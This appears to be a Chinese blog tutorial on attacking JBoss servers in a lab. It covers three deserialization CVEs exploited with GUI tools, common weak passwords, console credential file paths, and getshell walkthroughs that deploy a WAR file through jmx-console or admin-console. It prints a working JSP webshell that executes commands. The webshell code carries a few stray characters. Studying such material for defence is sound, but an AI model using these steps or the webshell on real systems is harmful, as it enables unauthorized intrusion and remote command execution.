**目录**

[Jboss](#t0)

[JBoss JMXInvokerServlet 反序列化漏洞(CVE-2015-7501)](#t1)

[JBoss 4.x JBossMQ JMS 反序列化漏洞（CVE-2017-7504）](#t2)

[JBoss 5.x/6.x 反序列化漏洞复现（CVE-2017-12149）](#t3)

[Jboss管理控制台](#t4)

[Jboss4.x](#t5)

[Jboss5.x/6.x](#t6)

[jboss4.x jmx-console管理后台未授权访问上传war包Getshell](#t7)

[Jboss 5.x/6.x admin-Console后台部署war包Getshell](#t8)

* * *

![](https://img-blog.csdnimg.cn/2020010922511650.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)
==================================================================================================================================================================================================

Jboss
=====

默认端口：8080

Jboss常见弱口令：

*   admin/admin
*   jboss/admin
*   admin/jboss
*   admin/123456
*   admin/password

JBoss JMXInvokerServlet 反序列化漏洞(CVE-2015-7501)
---------------------------------------------

这是经典的 JBoss [反序列化](https://so.csdn.net/so/search?q=%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96&spm=1001.2101.3001.7020)漏洞，JBoss在 /invoker/JMXInvokerServlet 请求中读取了用户传入的对象，然后我们可以利用 Apache Commons Collections 中的 Gadget 执行任意代码。

**漏洞探测**

此漏洞存在于JBoss中 /invoker/JMXInvokerServlet 路径。访问若提示下载 JMXInvokerServlet，则可能存在漏洞。

![](https://img-blog.csdnimg.cn/20200108224328752.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

这个漏洞利用工具是：java反序列终极化工具.jar

我们先启动靶机环境，访问：[http://192.168.10.13:8080/](http://192.168.10.13:8080/)

![](https://img-blog.csdnimg.cn/20191018103550464.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

打开我们的 java反序列终极化工具.jar 工具，选择jboss，输入目标主机的链接，点击目标信息，获取信息。等五六秒的样子，如果能出来目标主机的信息，则说明目标主机存在漏洞。如果没漏洞，会直接提示不存在漏洞，我们等待他的响应即可。

![](https://img-blog.csdnimg.cn/20191018102802307.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

执行系统命令

![](https://img-blog.csdnimg.cn/20191018102942220.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

参考文章：[JBoss JMXInvokerServlet 反序列化漏洞](https://vulhub.org/#/environments/jboss/JMXInvokerServlet-deserialization/)

JBoss 4.x JBossMQ JMS 反序列化漏洞（CVE-2017-7504）
-------------------------------------------

Red Hat JBoss Application Server 是一款基于JavaEE的开源应用服务器。JBoss AS 4.x及之前版本中，JbossMQ实现过程的JMS over HTTP Invocation Layer的HTTPServerILServlet.java文件存在反序列化漏洞，远程攻击者可借助特制的序列化数据利用该漏洞执行任意代码。

**漏洞探测**

该漏洞出现在 /jbossmq-httpil/HTTPServerILServlet 路径下。若访问200，则可能存在漏洞。

![](https://img-blog.csdnimg.cn/2020010823052118.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

这个漏洞利用工具是：java反序列终极化工具.jar

我们先启动靶机环境，访问：[http://192.168.10.13:8080/](http://192.168.10.13:8080/)

![](https://img-blog.csdnimg.cn/20191018102505971.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

打开我们的 java反序列终极化工具.jar工具，选择jboss，输入目标主机的链接，点击目标信息，获取信息。等十来秒的的样子，有时候需要等久一点，多点几次，如果能出来目标主机的信息，则说明目标主机存在漏洞。如果没漏洞，会直接提示不存在漏洞，我们等待他的响应即可。

![](https://img-blog.csdnimg.cn/20191018102802307.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

执行系统命令

![](https://img-blog.csdnimg.cn/20191018102942220.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

相关文章：[JBoss 4.x JBossMQ JMS 反序列化漏洞（CVE-2017-7504）](https://vulhub.org/#/environments/jboss/CVE-2017-7504/)

JBoss 5.x/6.x 反序列化漏洞复现（CVE-2017-12149）
--------------------------------------

该漏洞为 Java 反序列化错误类型，存在于 Jboss 的 HttpInvoker 组件中的 ReadOnlyAccessFilter 过滤器中。该过滤器在没有进行任何安全检查的情况下尝试将来自客户端的数据流进行反序列化，从而导致了漏洞。

**漏洞探测**

此漏洞路径存在于 /invoker/readonly。若访问此页面为500，则可能存在漏洞。

![](https://img-blog.csdnimg.cn/20200108231351658.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

这个漏洞利用工具是：java反序列终极化工具.jar   或   jboss反序列化\_CVE-2017-12149.jar

我们先启动靶机环境，访问：[http://192.168.10.13:8080/](http://192.168.10.13:8080/)

![](https://img-blog.csdnimg.cn/20191018103550464.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

开我们的 java反序列终极化工具.jar工具，选择jboss，输入目标主机的链接，点击目标信息，获取信息。等五六秒的样子，如果能出来目标主机的信息，则说明目标主机存在漏洞。如果没漏洞，会直接提示不存在漏洞，我们等待他的响应即可。

![](https://img-blog.csdnimg.cn/20191018102802307.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

执行系统命令

![](https://img-blog.csdnimg.cn/20191018102942220.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

或者利用工具：jboss反序列化\_CVE-2017-12149.jar

输入目标URL，点击检测，过几秒就看底下的信息看是否存在漏洞

![](https://img-blog.csdnimg.cn/2019101810380245.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

确认存在漏洞后，输入命令，点击执行，下面命令的回显了

![](https://img-blog.csdnimg.cn/20191018104054710.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

Jboss管理控制台
----------

### **Jboss4.x**

jboss 4.x 及其之前的版本 console 管理路径为 /jmx-console/ 和 /web-console/ 。

**jmx-console的配置文件为**

```
/opt/jboss/jboss4/server/default/deploy/jmx-console.war/WEB-INF/jboss-web.xml  #jboss的绝对路径不同网站不一样
```


![](https://img-blog.csdnimg.cn/20200109150755386.png)

**web-console的配置文件为**

```
/opt/jboss/jboss4/server/default/deploy/management/console-mgr.sar/web-console.war/WEB-INF/jboss-web.xml  #jboss的绝对路径不同网站不一样
```


![](https://img-blog.csdnimg.cn/20200109150936858.png)

**控制台账号密码**

jmx-console 和 web-console共用一个账号密码 ，账号密码文件在

```
/opt/jboss/jboss4/server/default/conf/props/jmx-console-users.properties      
格式为：账号:密码
```


![](https://img-blog.csdnimg.cn/2020010916434746.png)

![](https://img-blog.csdnimg.cn/20200108224132257.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20200109164450542.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20200109001257296.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20200109162733460.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### Jboss5.x/6.x

Jboss5.x开始弃用了 web-console ，增加了 admin-console。jboss5.x / 6.x 版本 console 路径为 /jmx-console/ 和 /admin-console/。

**jmx-console的配置文件为**

```
jboss/common/deploy/jmx-console.war/WEB-INF/jboss-web.xml  #jboss的绝对路径不同网站不一样
```


![](https://img-blog.csdnimg.cn/20200109152036321.png)

**admin-console的配置文件为**

```
jboss/common/deploy/admin-console.war/WEB-INF/jboss-web.xml   #jboss的绝对路径不同网站不一样
```


![](https://img-blog.csdnimg.cn/20200109152109365.png)

**控制台账号密码**

jmx-console 和 web-console 共用一个账号密码 ，账号密码文件在

```
jboss/server/default/conf/props/jmx-console-users.properties
```


![](https://img-blog.csdnimg.cn/20200109164026374.png)

![](https://img-blog.csdnimg.cn/20200108224132257.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20200109163356350.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20200108231608468.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20200109163302113.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

**jboss4.x jmx-console管理后台未授权访问上传war包Getshell**
-----------------------------------------------

Jboxx4.x /jmx-console/ 后台存在未授权访问，进入后台后，可直接部署 war 包Getshell。若需登录，可以尝试爆破弱口令登录。

直接访问: http://xx.xx.xx.xx:8000/jmx-console/   或者点击图片处

![](https://img-blog.csdnimg.cn/20200109180904819.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

进入后台后，点击 Jboss.deployment 进入应用部署页面,也可以直接输入URL进入

```
http://xx.xx.xx.xx:8080/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.deployment:type=DeploymentScanner,flavor=URL
```


![](https://img-blog.csdnimg.cn/20200109180948275.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

**生成war包**

one.jsp的内容如下

```
<%      
    if("123".equals(request.getParameter("pwd"))){      
        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();      
        int a = -1;                
        byte[] b = new byte[1024];                
        out.print("<pre>");                
        while((a=in.read(b))!=-1){      
            out.println(new String(b));                
        }      1
        out.print("</pre>");      1
    }       1
%>
```


![](https://img-blog.csdnimg.cn/20200109183214770.png)

将one.war放在我们的VPS上

![](https://img-blog.csdnimg.cn/20200109183310487.png)

**部署war包**

找到 void addURL()，注意这里ParamType是java.lang.String，然后在ParamValue填入我们远程的war包，点击invoke

![](https://img-blog.csdnimg.cn/2020010916163781.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20200109161727821.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

**查看部署是否成功**

返回到刚进入jmx-console的页面，找到 jboss.web.deployment，如下说明部署成功。如果没显示，多刷新几次页面或者等会儿，直到看到有部署的war包即可

![](https://img-blog.csdnimg.cn/20200109223806730.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

**访问木马**

### ![](https://img-blog.csdnimg.cn/20200109182843337.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

Jboss 5.x/6.x admin-Console后台部署war包Getshell
-------------------------------------------

Jboss5.X开始，jmx-console不能部署war包了，需要admin-console后台部署

登录进admin-console后台后，点击Web Application(WAR)s ，然后Add a new resource

![](https://img-blog.csdnimg.cn/20200109231854939.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

这里选择我们本地生成好的war包

![](https://img-blog.csdnimg.cn/20200109232008179.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20200109232031465.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

如下，部署成功

![](https://img-blog.csdnimg.cn/20200109232045328.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

访问木马

![](https://img-blog.csdnimg.cn/20200109232131755.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

相关文章：[jboss中控制台jmx-console 登录的用户名和密码设置](https://www.cnblogs.com/h2zZhou/p/10000637.html)